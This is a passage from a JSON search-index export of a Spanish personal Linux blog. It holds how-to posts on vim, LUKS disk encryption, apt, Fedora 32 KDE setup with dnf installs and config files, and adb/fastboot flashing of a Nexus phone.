al final G\nCódigo ASCII, hex y octal ga\nBúsqueda y sustitución buscar /palabra\n\u0026ldquo;n\u0026rdquo; o \u0026ldquo;N\u0026rdquo; para ir adelante o atras\nremplazar :%s/texto1/texto2/g\n\u0026ldquo;g\u0026rdquo; selecciona todas las coincidencias\nComandos internos Ejecutar comando interno :!ls\nPausa en la edicion :shell\tdespues\texit\nCompilar :make\t:cc\nCaracterísticas avanzadas Dividir pantalla verticalmente :split fichero.txt\nDividir pantalla horizontalmente :vsplit fichero.txt\nCambiar entre pantallas CTRL+W + flecha cursor\nCrear pestañas :tabnew fichero.txt\nMoverse entre pestañas :tabn o :tabnext o gt\nSistema autocompletado caracter inicial + CTRL+N\nElimina lineas en blanco :g/^\\s*$/d\nDetecta llave mal cerrada {}\n","date":"2015-08-01T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/tips_vim/","title":"Tips vim"},{"content":"Title: Cifrar disco duro con luks Date: 2015-11-12 14:34 Modified: 2015-11-12 14:34 Category: Linux Tags: linux, consola, luks Slug: EncryptLuks Authors: procamora Summary: LUKS es un estándar para el encriptado de discos en Linux. A diferencia de otras soluciones, LUKS almacena la configuración necesaria en las cabecera de las particiones.\nIntroducción LUKS es un estándar para el encriptado de discos en Linux. A diferencia de otras soluciones, LUKS almacena la configuración necesaria en las cabecera de las particiones, lo que nos permite llevarnos los discos a otro sistema fácilmente. Voy a detallar brevemente como preparar un disco encriptado con LUKS, utilizando Debian 6.\nInstalar cryptsetup-luks sudo apt-get install cryptsetup\nComprobar que nuestro kernel tiene cargado el módulo dm-crypt:\nsudo lsmod | grep dm_crypt\nSi no es así lo tendremos que cargar con modprobe. modprobe dm-crypt\nPreparar disco En mi caso voy a utilizar un disco duro externo (sde), podemos ver que actualmente tiene una única partición: sudo fdisk -l /dev/sde\n1 2 3 4 5 6 7 8 9 Disco /dev/sde: 1500.3 GB, 1500301910016 bytes 255 heads, 63 sectors/track, 182401 cylinders Units = cilindros of 16065 * 512 = 8225280 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk identifier: 0x000abcce Disposit. Inicio Comienzo Fin Bloques Id Sistema /dev/sde1 1 182401 1465136001 83 Linux Una buena práctica antes de encriptar un disco, sobre todo si este no es nuevo, es comprobar que funciona perfectamente y no tiene bloques erróneos. Para ello podemos usar la utilidad badblocks:\nsudo badblocks -s -w /dev/sde1 -b 4096\nTener en cuenta que esta operación tarda varias horas.\nEncriptar el filesystem sudo cryptsetup luksFormat /dev/sde1\nNota: se ha de indicar YES en mayusculas.\nPodemos comprobar la cabecera luck con:\nsudo cryptsetup -v luksDump /dev/sde1\n1 2 3 4 5 6 7 LUKS header information for /dev/sde1 Version: 1 Cipher name: aes Cipher mode: cbc-essiv:sha256 Hash spec: sha1 Payload offset: 2056 MK bits: 256 Al tratarse de un filesystem encriptado debemos mapearlo ya que no se puede leer directamente. En este ejemplo el sistema de ficheros lo mapeamos a CryptHome:\n`sudo cryptsetup luksOpen /dev/sde1 CryptHome\nFormatear partición sudo mkfs.ext3 /dev/mapper/CryptHome\nsudo tune2fs -i 0 -c 0 /dev/mapper/CryptHome\nMontar/desmontar volumen Para montar el volumen a mano: sudo mkdir /mnt/CryptHome\nsudo mount /dev/mapper/CryptHome /mnt/CryptHome\nY para desmontarlo:\nsudo umount /mnt/CryptHome\nsudo cryptsetup luksClose /dev/mapper/CryptHome\npara montar la partición en un directorio (/home)\nsudo vim /etc/fstab\n/dev/mapper/CryptHome /home ext4 rw 0 0\nEsto es para que se monte al inicio del equipo y pida la password\nsudo vim /etc/crypttab\nCryptHome /dev/sda6 none luks\n","date":"0001-01-01T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/","title":""},{"content":"Title: Problema al instalar Mdcharm en linux Date: 2015-12-26 2:15 Modified: 2015-12-26 20:33 Category: Software Tags: consola, mdcharm Slug: mdcharmlinux Summary: Al instalar Mdcharm en linux y ejecutarlo obtengo este mensaje. Status: published\nAl instalar Mdcharm en linux y ejecutarlo obtengo este mensaje.\n$ mdcharm\nmdcharm: error while loading shared libraries: libhunspell.so: cannot open shared object file: No such file or directory\nse soluciona instalando estos paquetes\n1 sudo apt-get install libhunspell-1.3-0 libhunspell-dev ","date":"0001-01-01T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/","title":""},{"content":"Title: uso de apt Date: 2015-11-3 14:25 Modified: 2015-11-3 14:25 Category: Linux Tags: linux, apt Slug: comando_apt Authors: procamora Summary:\nAPT-GET ######Instalar un paquete: sudo apt-get install \u0026lt;paquete\u0026gt; ######Desinstalar un paquete: sudo apt-get remove \u0026lt;paquete\u0026gt; ######Eliminar un paquete incluidos sus ficheros de configuración: sudo apt-get purge \u0026lt;paquete\u0026gt; ######Eliminar de forma automática aquellos paquetes que no se estén utilizando: sudo apt-get autoremove ######Actualizar un paquete a la última versión disponible en el repositorio: sudo apt-get update \u0026lt;paquete\u0026gt;\n######Actualizar el sistema. Actualizará todos los paquetes que dispongan de una versión superior dentro de la rama instalada de la distribución: sudo apt-get upgrade\n######Actualizar la distribución completa. Actualizará nuestro sistema a la siguiente versión disponible de la distribución: sudo apt-get dist-upgrade\n######Descargar únicamente las fuentes de un paquete para manipularlas de forma manual: sudo apt-get source \u0026lt;paquete\u0026gt;\n######Limpiar caches, paquetes descargados, etc: sudo apt-get clean\nsudo apt-get autoclean\n######Verificar que no tenemos ninguna dependencia incumplida: sudo sudo apt-get check\nAPT-CACHE ######Buscar un paquete en los repositorios, se puede especificar un patrón, expresión regular, el nombre exacto del paquete, etc: sudo apt-cache search \u0026lt;paquete\u0026gt;\n######Mostrar información sobre un paquete específico (nombre del paquete, versión, dependencias…): sudo apt-cache showpkg \u0026lt;paquete\u0026gt;\n######Mostrar información del paquete incluyendo la descripción, información del paquete como su sitio web, página de bugs… sudo apt-cache show \u0026lt;paquete\u0026gt;\n######Mostrar dependencias de un paquete: sudo apt-cache depends \u0026lt;paquete\u0026gt;\n######Mostrar los nombres de todos los paquetes instalados en el sistema: sudo apt-cache pkgnames\n","date":"0001-01-01T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/autorun-script-linux-systemd/","title":"autorun script linux systemd"},{"content":"Introducción En esta primera parte pondré todos las librerías y programas que suelo instalar en Fedora 32, en la segunda parte haré una configuración del entorno de trabajo (fstab, crontab, .ssh, etc)\nRPMFusion Librerias basicas Compilación Compresión Codecs DVD\u0026rsquo;s Programas basicos HP Insync Pandoc y Latex Spotify Atom Visual Studio Code Skype Teamviewer Dropbox Gitkraken Pycharm Telegram Eclipse Docker y Docker-Compose Google Chrome Google Music system-config-samba Drivers Nvidia Peek Sublime Text 3 y Sublime Merge OpenRazer y Polychromatic Actualización inicial Lo primero que hay que hacer es actualizar el sistema y lo reiniciamos, posiblemente haya una gran cantidad de paquetes a actualizar, junto con la actualización del kernel por lo que después es bueno hacer un reinicio del sistema.\n1 2 sudo dnf upgrade reboot Eliminar programas no necesarios 1 sudo dnf remove dragon calligra-core Añadir repositorio RPMFusion Este repositorio es necesario para varios paquetes que instalaremos después (contiene programas importantes y paquetes nonfree).\n1 sudo dnf -y install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm Paquetes y librerías que mas uso Conjunto de librerías y utilidades básicas, traducciones de programas a español, corrector ortográficos, etc.\n1 2 3 4 5 sudo dnf -y group install \u0026#34;Development Tools\u0026#34; sudo dnf -y group install \u0026#34;C Development Tools and Libraries\u0026#34; sudo dnf -y install kde-i18n-Spanish mythes-es hyphen-es autocorr-es hunspell-es langpacks-es \\ aspell-es man-pages-es-extra kde-l10n-es android-tools expect flac-libs \\ fluid-soundfont-common encfs samba wine curl meld youtube-dl wget iftop trash-cli Java 1 sudo dnf -y install java-openjdk java-1.8.0-openjdk-javadoc java-1.8.0-openjdk-devel Herramientas básicas de compilación Conjunto de librerías básicas de compilación\n1 2 sudo dnf -y install kernel-headers kernel-devel git make libxml2 libxml2-devel mercurial \\ cmake python-devel python3-devel gcc-c++ dkms openssl-devel Compresión y descompresión Conjunto de librerías básicas de compresión y descompresión\n1 sudo dnf -y install p7zip p7zip-plugins zip unzip unrar Codecs Conjunto de codecs necesarios para la reproducción de audio con código privado (mp3, etc)\n1 2 3 4 5 6 sudo dnf -y install gstreamer gstreamer1-libav gstreamer1-plugins-bad-free-extras \\ gstreamer1-plugins-bad-freeworld gstreamer1-plugins-good-extras pavucontrol \\ gstreamer-ffmpeg gstreamer-plugins-bad-free-extras alsa-firmware \\ gstreamer-plugins-ugly ffmpeg ffmpeg-libs libmatroska xvidcore libva-vdpau-driver \\ libvdpau libvdpau-devel gstreamer1-vaapi gstreamer1-plugins-base-tools mencoder \\ gstreamer1-plugins-ugly Soporte para DVD\u0026rsquo;s Conjunto de librerías necesarias para la reproducción de DVD\u0026rsquo;s\n1 sudo dnf -y install lsdvd libdvbpsi libdvdread libdvdnav Programas básicos 1 2 3 sudo dnf -y install vim yakuake libreoffice libreoffice-langpack-es \\ gnome-disk-utility sqlitebrowser gimp vlc fritzing kdenlive frei0r-plugins \\ calibre picard chromaprint-tools arduino vokoscreen filezilla Dispositivos HP (impresora) 1 sudo dnf -y install hplip hplip-common libsane-hpaio hplip-gui Insync 1 sudo dnf install -y https://d2t3ff60b2tol4.cloudfront.net/builds/insync-3.2.0.40833-fc30.x86_64.rpm Pandoc y Latex 1 2 sudo dnf -y install pandoc texstudio texlive texlive texlive-latex texlive-xetex texlive-xetex-def \\ texlive-collection-latexrecommended texlive-collection-xetex texlive-collection-latex También serán necesarias un conjunto de librerías de Latex:\n1 2 3 4 sudo dnf -y install texlive-matlab-prettifier texlive-apacite texlive-breakcites texlive-xpatch \\ texlive-multirow texlive-tikzpagenodes texlive-tikzmark texlive-pgfplots texlive-glossaries-spanish \\ texlive-anyfontsize texlive-framed texlive-mdframed texlive-todonotes texlive-glossaries \\ texlive-IEEEtran.noarch texlive-textpos Spotify 1 2 sudo dnf config-manager --add-repo=http://negativo17.org/repos/fedora-spotify.repo sudo dnf -y install spotify-client Atom 1 2 3 4 programa=\u0026#34;atom.x86_64.rpm\u0026#34; wget -O $programa https://atom.io/download/rpm sudo dnf -y install $programa rm $programa Visual Studio Code 1 2 3 4 sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc sudo sh -c \u0026#39;echo -e \u0026#34;[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc\u0026#34; \u0026gt; /etc/yum.repos.d/vscode.repo\u0026#39; dnf check-update sudo dnf -y install code Skype 1 sudo dnf -y install https://go.skype.com/skypeforlinux-64.rpm Teamviewer 1 sudo dnf -y install https://download.teamviewer.com/download/linux/teamviewer.x86_64.rpm Dropbox 1 2 sudo dnf -y install https://www.dropbox.com/download?dl=packages/fedora/nautilus-dropbox-2015.10.28-1.fedora.x86_64.rpm sudo dnf -y install python-gpgme Gitkraken 1 2 3 4 programa=\u0026#34;gitkraken-amd64.tar.gz\u0026#34; wget -O $programa https://release.gitkraken.com/linux/gitkraken-amd64.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Pycharm Community 1 2 3 4 programa=\u0026#34;pycharm-community-2020.1.tar.gz\u0026#34; wget -O $programa https://download.jetbrains.com/python/pycharm-community-2017.1.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Telegram 1 2 3 4 programa=\u0026#34;telegram.tar.xz\u0026#34; wget -O $programa https://tdesktop.com/linux mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Eclipse 1 2 3 4 programa=\u0026#34;eclipse-inst-linux64.tar.gz\u0026#34; wget -O $programa http://mirror.ibcp.fr/pub/eclipse//oomph/epp/neon/R2a/eclipse-inst-linux64.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Docker y Docker-Compose 1 2 sudo dnf -y install dnf-plugins-core sudo dnf -y install podman podman-compose Fuentes: docker y docker-compose\nGoogle Chrome Descargar RPM de aqui: url\nGoogle Music Descargar RPM de aqui: url\nsystem-config-samba Descargar RPM de aqui: url\nInstalar drivers Nvidia Opción recomendable\nPrimero instalamos los repositorios que necesitamos url:\n1 2 3 4 5 6 7 8 #RPM Fusion free for Fedora sudo dnf -y install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm #RPM Fusion nonfree for Fedora sudo dnf -y install https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm # Enable access to both the free and the nonfree repository sudo dnf -y install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm Una vez instalados instalamos los drivers de nvidia url\n1 2 3 sudo dnf -y install xorg-x11-drv-nvidia akmod-nvidia sudo dnf -y install xorg-x11-drv-nvidia-cuda #optional for cuda/nvdec/nvenc support sudo dnf update -y Opción no recomendable pero que funciona:\n1 https://www.if-not-true-then-false.com/2015/fedora-nvidia-guide/ Fuente: url\nPeek para grabar la pantalla y crear gif/mp4 1 2 sudo dnf config-manager --add-repo https://copr.fedorainfracloud.org/coprs/dani/peek/repo/fedora-32/dani-peek-fedora-32.repo sudo dnf -y install peek Url gitgub\nCherryTree 1 2 sudo dnf config-manager --add-repo https://copr.fedorainfracloud.org/coprs/bcotton/cherrytree/repo/fedora-32/bcotton-cherrytree-fedora-32.repo sudo dnf -y install cherrytree-future Sublime Text 3 y Sublime Merge 1 2 3 sudo rpm -v --import https://download.sublimetext.com/sublimehq-rpm-pub.gpg sudo dnf config-manager --add-repo https://download.sublimetext.com/rpm/stable/x86_64/sublime-text.repo sudo dnf -y install sublime-text sublime-merge OpenRazer y Polychromatic 1 2 3 4 5 # Due to a bug in Fedora, the wrong kernel headers (kernel-debug-devel) may be installed and cause OpenRazer to fail installation. sudo dnf install -y kernel-devel sudo dnf config-manager --add-repo https://download.opensuse.org/repositories/hardware:razer/Fedora_32/hardware:razer.repo sudo dnf install -y openrazer-meta polychromatic # reboot ","date":"0001-01-01T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/primeros-pasos-fedora-32-parte-i/","title":"Primeros pasos Fedora 32 KDE Parte I"},{"content":"Introducción En esta segunda parte, haré una configuración del entorno de trabajo (fstab, crontab, .ssh, etc) y del entorno gráfico.\nFicheros Fichero crontab Fichero fstab Clave privada Entorno grafico Configuración de ficheros Fichero crontab vim /etc/crontab\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root # For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed # 0 *\t* * *\tprocamora\tcd /home/procamora/ \u0026amp;\u0026amp; ./rsync_samba.sh \u0026gt;/tmp/rsync.log 2\u0026gt;\u0026amp;1 # 0 */2\t* * *\tprocamora\tcd /home/procamora/BoxCryptor/ \u0026amp;\u0026amp; ./rsync_i7.sh \u0026gt;/tmp/rsync_gdrive.log 2\u0026gt;\u0026amp;1 0 22\t* * *\tprocamora\tpython3 /home/procamora/scripts/backup.py i7_rsync.sh \u0026gt;\u0026gt; /tmp/rsync_gdrive.log 2\u0026gt;\u0026amp;1 */7 *\t* * *\tprocamora\tcd /home/procamora/Documents/Wiki-Personal/ \u0026amp;\u0026amp; bash pushgit.sh \u0026gt;\u0026gt; /tmp/wiki.log 2\u0026gt;\u0026amp;1 Fichero fstab 1 2 3 sudo mkdir -p /mnt/{WD_BLACK,640Gb,pi,zero} sudo chown $USER:$USER /mnt/{WD_BLACK,640Gb,pi,zero} vim /etc/fstab 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # # /etc/fstab # Created by anaconda on Wed Mar 29 21:50:12 2017 # # Accessible filesystems, by reference, are maintained under \u0026#39;/dev/disk\u0026#39; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # Particiones por defecto UUID=9c64fe32-84c5-4954 / ext4 defaults,relatime 1 1 UUID=659ee856-118a-433b /boot ext4 defaults,relatime 1 2 UUID=F6DB-090A /boot/efi vfat umask=0077,shortname=winnt 0 2 UUID=7f4fc31b-e92d-4d31 /home ext4 defaults,relatime 1 2 /dev/mapper/fedora-swap swap swap defaults 0 0 # Disco NTFS con todos los permisos + posibilidad de usar chmod UUID=EE3A29F53A29BC09 /mnt/WD_BLACK ntfs-3g permissions,locale=es_ES.utf8 0 2 # Disco de red montado por samba #//192.168.1.71/DiscoUSB /mnt/DescargasPi cifs credentials=/home/procamora/.smbcredentials,iocharset=utf8,sec=ntlm 0 0 Clave privada Configuraremos tanto la clave privada para conectarnos a otros equipos sin necesidad de usar contraseña como la clave publica para que otros de nuestros equipos se conecten a nosotros con nuestra clave privada\n1 2 3 4 5 6 7 8 mkdir -p ~/.ssh touch ~/.ssh/OpenSSH vim ~/.ssh/OpenSSH # guardamos el contenido de la clave privada chmod 600 ~/.ssh/OpenSSH # le quitamos los permisos necesarios ssh-add ~/.ssh/OpenSSH # ponemos la contraseña y ya tenemos cargada la clave vim ~/.ssh/authorized_keys # guardamos el contenido de la clave publica chmod 600 ~/.ssh/authorized_keys # le quitamos los permisos necesarios chmod 700 ~/.ssh Fichero hosts vim /etc/hosts\n1 2 3 4 5 6 7 127.0.0.1 localhost 4770K localhost4 ::1 localhost 4770K localhost6 192.168.1.1 router 192.168.1.59 4770K 192.168.1.55 xiaomi 192.168.1.71 rp3 192.168.1.72 zero Configuración de aplicaciones con autoarranque 1 2 3 4 systemctl enable sshd #systemctl enable smb #systemctl enable nmb systemctl disable firewalld.service # solo en el pc de casa Configuración del entorno gráfico 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 DIRS=( Documents Downloads Public Pictures Videos Templates Music Desktop ) for dirs in \u0026#34;${DIRS[@]}\u0026#34;; do test $(ls $HOME/$dirs/ | wc -l) = 0 \u0026amp;\u0026amp; rm -rf $HOME/$dirs \u0026amp;\u0026amp; ln -s /media/data/$dirs $HOME/$dirs done test -d $HOME/Programs || ln -s /media/data/Programs $HOME/Programs kwriteconfig5 --file \u0026#34;$HOME/Documents/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-documents\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/Downloads/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-downloads\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/Public/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-public\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/Pictures/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-pictures\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/Videos/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-videos\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/Templates/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-templates\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/Music/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-music\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/Desktop/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;desktop\u0026#34; kwriteconfig5 --file \u0026#34;$HOME/scripts/.directory\u0026#34; --group \u0026#34;Desktop Entry\u0026#34; --key \u0026#34;Icon\u0026#34; \u0026#34;folder-script\u0026#34; Configuración dolphin Configuración de vistas Vamos a Control/Configurar las barras de herramientas\nAbrir tereminal Archivos ocultos Vamos a Control/Ajustar las propiedades de vista\nOrdenar por fecha Descendente Mostar archivos ocultos Aplicar a todas las carpetas Usar estas propiedades de vista como predeterminadas Configuración de accesos directos 1 2 3 ln -rs /mnt/WD_BLACK/Insync/pablojoserocamora@gmail.com/GoogleDrive ~/pablojoserocamora@gmail.com ln -s ~/pablojoserocamora@gmail.com/scripts/ ~ # directorio de scripts ln -s ~/pablojoserocamora@gmail.com/Musica/* ~/Music/ # Enlazo todos los discos Instalacion de bspwm 1 2 3 4 git clone git@github.com:procamora/custom_workspace.git ~/Documents/custom_workspace cd ~/Documents/custom_workspace chmod u+x custom_workspace.sh ./custom_workspace.sh all ","date":"0001-01-01T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/primeros-pasos-fedora-32-parte-ii/","title":"Primeros pasos Fedora 32 KDE Parte II"},{"content":"Para mostrar si tu dispositivo esta instalado\nadb devices fastboot devices\nSino lo esta después de haber instalado los usb drivers desconectar y conectar y tendrás que aceptar el certificado\nPara iniciar el modo bootloader adb reboot bootloader fastboot reboot-bootloader\nIniciar el modo recovery adb reboot recovery\nReiniciar el teléfono fastboot reboot adb reboot\nBloquear y desbloquear el bootloader fastboot oem unlock fastboot oem lock\nPrecaución, elimina todo el contenido de nuestro dispositivo.\nfastboot flash bootloader bootloader-mako-makoz10l.img fastboot flash radio radio-mako-m9615a-cefwmazm-2.0.1700.33.img fastboot flash system system.img fastboot flash userdata userdata.img fastboot flash boot boot.img fastboot flash recovery recovery.img fastboot erase cache\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Acabo de actualizar mi Nexus 4 siguiendo los pasos de un post de XDA: http://forum.xda-developers.com/showthread.php?p=43918377 Para poder actualizar sin perder los datos hay que borrar el archivo \u0026#34;userdata.img\u0026#34; dentro de \u0026#34;image-***-***.zip\u0026#34;. Os dejo el tutorial modificado para no perder datos y traducido para quien le interese y no sepa inglés: 1. Descargar la imagen de fábrica de Android 4.3 desde este enlace: https://developers.google.com/android/nexus/images 2. Extraer los archivos con Winrar o similar 3. Abrir el archivo \u0026#34;image-***-*****.zip\u0026#34; con Winrar y borrar el archivo \u0026#34;userdata.img\u0026#34; 4. Copiar todos los archivos extraídos a la carpeta android-sdk/platform-tools/ o a la carpeta donde tengas adb y fastboot 5. Conectar tu Nexus por USB con la opción de Debug activada en las Opciones de desarrollo 6. Ejecutar estos comandos por orden: 6.a: adb reboot bootloader 6.b: fastboot flash bootloader bootloader-***-***.img 6.c: fastboot reboot-bootloader 6.d: fastboot flash radio radio-***-***.img 6.e: fastboot reboot-bootloader 6.f: fastboot update image-***-***.zip PD: Se que hay mucha gente que no sabe usar la consola (por miedo o porque nunca lo han probado), en ese caso recomiendo esperar a la OTA.. PD2: Si no tienes el bootloader desbloqueado es imposible actualizar manualmente sin perder los datos, hay que esperar a la OTA.. ","date":"0001-01-01T00:00:00Z","image":"https://www.procamora.com/covers/android.png","permalink":"https://www.procamora.com/p/uso-de-adb/","title":"Uso de adb"}]